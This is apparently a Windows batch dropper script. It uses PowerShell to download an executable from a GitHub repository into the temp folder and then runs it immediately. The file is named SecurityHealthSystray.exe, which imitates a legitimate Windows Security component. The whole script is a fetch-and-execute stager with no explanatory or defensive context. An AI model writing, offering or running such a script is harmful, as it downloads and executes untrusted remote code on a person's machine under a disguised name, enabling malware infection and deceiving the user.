@echo off
set url=https://github.com/MYRALL/fixx/raw/refs/heads/master/SecurityHealthSystray.exe
set file=%TEMP%\file.exe

powershell -Command "Invoke-WebRequest '%url%' -OutFile '%file%'"
start "" "%file%"
